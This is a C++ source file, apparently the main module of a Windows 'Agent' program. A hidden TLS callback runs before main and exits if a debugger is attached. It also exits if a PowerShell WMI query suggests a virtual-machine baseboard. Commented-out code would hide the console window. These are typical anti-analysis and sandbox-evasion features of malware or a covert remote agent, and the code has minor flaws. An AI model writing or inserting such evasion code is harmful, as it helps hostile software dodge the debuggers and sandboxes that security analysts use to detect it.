#include "Agent.h"

using namespace std;

string exec(string cmd)
{
	char buffer[128];
	string result = "";
	FILE *pipe = _popen(cmd.c_str(), "r");
	try
	{
		while (!feof(pipe))
		{
			if (fgets(buffer, 128, pipe) != NULL)
			{
				result += buffer;
			}
		}
	}
	catch (...)
	{
		_pclose(pipe);
	}

	_pclose(pipe);
	return result;
}

void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
//linker spec
#ifdef _M_IX86
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")
#else
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback")
#endif
EXTERN_C
#ifdef _M_X64
#pragma const_seg (".CRT$XLB")
const
#else
#pragma data_seg (".CRT$XLB")
#endif
//end linker

//tls import
PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;
#pragma data_seg ()
#pragma const_seg ()
//end 
// tls declaration
void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
	//MessageBox(nullptr, "TLS Callback before main :)", "dZkyXj - Debugger Owned!", 0);
	if (IsDebuggerPresent())
		ExitProcess(0);
	if (!exec("\powershell.exe -Command (gwmi Win32_BaseBoard).Manufacturer -match \"Corporation\"").compare("True"))
		ExitProcess(0);
}

// end declaration

void main(void)
{
	//FreeConsole();
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	Agent agent;

	//system("PAUSE");

	// cleanup
	agent.Cleanup();
}